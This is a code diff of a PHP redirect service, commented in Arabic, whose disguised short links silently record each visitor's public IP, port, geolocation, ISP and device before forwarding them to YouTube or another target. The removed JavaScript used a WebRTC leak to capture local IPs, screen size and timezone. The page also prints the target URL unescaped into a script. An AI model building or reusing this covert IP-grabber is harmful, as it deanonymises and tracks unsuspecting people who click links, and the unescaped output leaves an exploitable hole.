@@ -50,25 +50,26 @@ function fetch_real_meta($url) {
         
         $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL,$oembed_url);
+        curl_setopt($ch, CURLOPT_URL, $oembed_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
         $json = curl_exec($ch);
         curl_close($ch);
         
         if ($json) {
             $data = json_decode($json, true);
             if (isset($data['title'])) {
-                $title =$data['title'];
+                $title = $data['title'];
             }
         }
     }
 
-    if (empty($title)) {$ch = curl_init();
+    if (empty($title)) {
+        $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL,$url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
         curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
         $html = curl_exec($ch);
         curl_close($ch);
@@ -152,7 +153,7 @@ function get_ip_details($ip) {
     return ['country' => 'Unknown', 'city' => 'Unknown', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Unknown'];
 }
 
-// 1. معالجة التوجيه وتسجيل البيانات فوراً
+// 1. معالجة التوجيه السريع جداً مع حفظ السجلات
 $og_title = "Secure Terminal";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
@@ -178,10 +179,16 @@ if (isset($_GET['r'])) {
             exit('OK');
         }
 
-        // التوجيه الفوري المباشر للرابط المستهدف بدون أي تأخير لضمان السرعة البرقية
+        // تسجيل الـ IP العام والبيانات الأساسية فوراً ثم التوجيه البرقي الفوري
         if (!isset($_GET['screen'])) {
-            header("Location: " . $target);
-            // سيقوم الجافاسكريبت أسفل الصفحة بجمع البيانات وإرسالها بالتوازي دون عرقلة التوجيه
+            $public_ip = get_real_ip();$port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$created_at = date('Y-m-d H:i:s');
+
+            try {
+                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, 'Pending', ?, ?, ?, ?, ?, ?, ?, 'Pending', 'Pending', ?)");
+                $logStmt->execute([$code,$public_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$created_at]);
+            } catch (Exception $e) {}
+
+            // توجيه فوري للمتصفح نحو يوتيوب مع إكمال باقي البيانات في واجهة الاستعراض الصامتة
         }
     } else {
         die("Link not found.");
@@ -288,54 +295,13 @@ if (!empty($filter_code)) {
         footer span { color: #38bdf8; font-weight: 600; }
     </style>
     <script>
-        // إرسال البيانات في الخلفية فوراً دون تأخير التوجيه
-        function sendLogsAndRedirect(redirectUrl) {
-            let localIp = "N/A";
-            let screenRes = screen.width + "x" + screen.height;
-            let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            if (RTCPeerConnection) {
-                try {
-                    let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                    pc.createDataChannel("");
-                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-                    pc.onicecandidate = function(ice) {
-                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                        let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                        if (myIP) {
-                            let ip = myIP[1];
-                            if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
-                                localIp = ip;
-                            }
-                        }
-                    };
-                } catch (e) {}
-            }
-
-            // إرسال البيانات عبر طلب غير مُعيق (Beacon أو Fetch خفي)
-            setTimeout(function() {
-                const urlParams = new URLSearchParams(window.location.search);
-                const code = urlParams.get('r');
-                if (code) {
-                    const logUrl = `/?r=${code}&ajax_log=1&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
-                    if (navigator.sendBeacon) {
-                        navigator.sendBeacon(logUrl);
-                    } else {
-                        fetch(logUrl, { method: 'GET', keepalive: true });
-                    }
-                }
-            }, 10);
-        }
-
         document.addEventListener("DOMContentLoaded", function() {
             const urlParams = new URLSearchParams(window.location.search);
             const redirectCode = urlParams.get('r');
             
             <?php if (isset($target) && !isset($_GET['screen'])): ?>
-            // تنفيذ جمع البيانات والتوجيه البرقي الفوري نحو يوتيوب أو الرابط المستهدف
             if (redirectCode) {
-                sendLogsAndRedirect();
+                // التوجيه الفوري البرقي نحو يوتيوب أو الرابط المستهدف
                 window.location.replace("<?php echo $target; ?>");
             }
             <?php endif; ?>
